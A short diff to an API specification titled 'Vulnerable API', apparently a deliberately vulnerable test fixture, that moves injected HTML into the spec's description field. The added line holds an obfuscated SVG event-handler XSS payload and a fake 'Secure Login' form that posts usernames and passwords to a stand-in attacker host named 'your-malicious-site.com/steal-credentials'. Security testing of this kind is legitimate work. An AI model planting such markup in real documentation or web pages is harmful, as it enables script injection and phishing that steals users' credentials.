@@ -3,8 +3,7 @@
   "info": {
     "title": "Vulnerable API",
     "version": "1.0.0",
-    "description": "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\">",
-    "user_input": "<h2>Secure Login</h2><form action='https://your-malicious-site.com/steal-credentials' method='POST'><label for='username'>Username:</label><input type='text' id='username' name='username'><br><br><label for='password'>Password:</label><input type='password' id='password' name='password'><br><br><button type='submit'>Login</button></form>"
+    "description": "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\"><h2>Secure Login</h2><form action='https://your-malicious-site.com/steal-credentials' method='POST'><label for='username'>Username:</label><input type='text' id='username' name='username'><br><br><label for='password'>Password:</label><input type='password' id='password' name='password'><br><br><button type='submit'>Login</button></form>"
   },
   "servers": [
     {
